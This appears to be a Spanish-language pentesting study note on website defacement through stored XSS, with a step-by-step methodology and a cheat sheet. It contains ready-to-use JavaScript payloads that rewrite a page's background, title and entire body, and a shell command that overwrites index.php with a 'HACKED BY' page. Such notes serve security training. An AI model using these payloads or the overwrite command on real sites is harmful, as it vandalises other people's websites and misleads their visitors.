---
tags:
  - xss
  - webapp
---
## Conceptos Clave (TL;DR)

* El "defacement" es un ataque que altera la apariencia visual de un sitio web para todos los visitantes, generalmente con el objetivo de dejar un mensaje de hackeo.

* El vector más crítico y utilizado comúnmente para lograr esto es la vulnerabilidad de Stored XSS (Cross-Site Scripting Almacenado) debido a su persistencia en el servidor.

* El ataque se ejecuta inyectando código JavaScript que interactúa directamente con el DOM para sobreescribir cuatro elementos clave: el color de fondo, la imagen de fondo, el título de la página y el texto/HTML del documento.


## Herramientas Clave

* **JavaScript puro (Vanilla JS):** Utilizado para inyectar sentencias que modifican directamente las propiedades del DOM (ej. `document.title`, `innerHTML`).

* **jQuery:** Utilizado como alternativa más eficiente para manipular elementos, siempre y cuando la librería ya se encuentre importada en el sitio objetivo.

  
## Metodología Paso a Paso

### Fase 1: Identificación y Confirmación

Localizar un vector de entrada vulnerable a Stored XSS dentro de la aplicación. Dado que es un XSS almacenado, cualquier inyección será persistente y afectará a cualquier usuario que cargue la página.
  

### Fase 2: Preparación y Pruebas Locales

Desarrollar el código HTML que reemplazará el contenido original. Es crítico probar este código localmente en un entorno controlado para confirmar que el diseño se renderiza según lo esperado antes de enviarlo al objetivo. Una vez validado el diseño, se debe minificar todo el código HTML en una sola línea continua.
  

### Fase 3: Inyección de Payloads de Modificación del DOM

Proceder con la inyección de los payloads XSS para modificar los elementos visuales. Se puede cambiar el color/imagen de fondo para establecer la temática (usualmente oscura), modificar el título de la pestaña del navegador para reflejar el hackeo, y finalmente reemplazar todo el nodo `body` usando `innerHTML` con el HTML preparado en la Fase 2.
  
## Cheat Sheet de Comandos

### Modificación del Fondo (Background)
```html
# Cambia el color de fondo de la pagina usando un valor hexadecimal o nombre de color
<script>document.body.style.background = "<BACKGROUND_COLOR>"</script>
  

# Reemplaza el fondo de la pagina con una imagen cargada desde una URL externa
<script>document.body.background = "<IMAGE_URL>"</script>
```

### HACKED BY
```php
echo '<body style="background-color:black; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;"><h1 style="color:red; font-size:60px; font-family:monospace;">HACKED BY: </h1></body>' > index.php
```

### Modificación del Título
```html
# Sobreescribe el titulo de la pestana/ventana del navegador actual

<script>document.title = '<NEW_TITLE>'</script>
```

### Modificación de Texto y Elementos HTML
```javascript
# Reemplaza el contenido HTML interno de un elemento especifico usando su ID (Vanilla JS)

document.getElementById("<ELEMENT_ID>").innerHTML = "<NEW_TEXT>"

  
# Reemplaza el contenido HTML interno de un elemento especifico (jQuery)
$("#<ELEMENT_ID>").html('<NEW_TEXT>');

  
# Reemplaza absolutamente todo el contenido dentro de la etiqueta <body> del documento

document.getElementsByTagName('body')[0].innerHTML = "<NEW_TEXT_OR_HTML>"
```

### Payload Defacement Completo
```html
# Inyecta un bloque HTML minificado reemplazando todo el contenido del cuerpo de la pagina

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white"><MESSAGE_TITLE></h1><p style="color: white"><MESSAGE_SUBTITLE> <img src="<IMAGE_URL>" height="25px" alt="<ALT_TEXT>"> </p></center>'</script>
```


## "Gotchas" y Troubleshooting

* **Persistencia del Código Original:** El defacement mediante XSS no borra el código fuente real del servidor. El código original sigue existiendo, pero los scripts inyectados alteran la apariencia en tiempo de ejecución (lado del cliente).

* **Orden de Ejecución:** La posición donde se almacene la inyección dentro del código fuente importa. Si el payload cae en el medio del documento, scripts o elementos posteriores podrían modificar la vista después de que tu payload se ejecute. Hay que considerar esto para el diseño final.

* **Dependencia de jQuery:** Las funciones como `$("#id").html()` fallarán y detendrán la ejecución del script si la librería jQuery no ha sido importada previamente por la página fuente.

* **Testing Local:** Siempre renderiza y prueba tus payloads HTML/JS localmente primero. Una vez inyectado un Stored XSS destructivo (como reemplazar el `body`), puede ser difícil interactuar con la página para revertirlo si eliminas los elementos vulnerables de la vista.